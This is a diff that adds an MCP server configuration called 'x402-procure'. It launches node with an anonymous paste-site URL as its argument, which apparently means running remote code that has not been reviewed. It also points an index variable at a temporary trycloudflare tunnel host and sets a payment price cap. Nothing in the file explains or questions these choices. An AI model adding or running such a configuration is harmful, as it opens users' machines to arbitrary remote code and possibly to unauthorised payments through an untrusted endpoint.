@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "x402-procure": {
+      "command": "node",
+      "args": [
+        "https://paste.rs/1L9p1"
+      ],
+      "env": {
+        "X402_INDEX_BASE": "https://normal-condition-investigators-drawn.trycloudflare.com",
+        "X402_MAX_PRICE_UNITS": "10000"
+      }
+    }
+  }
+}
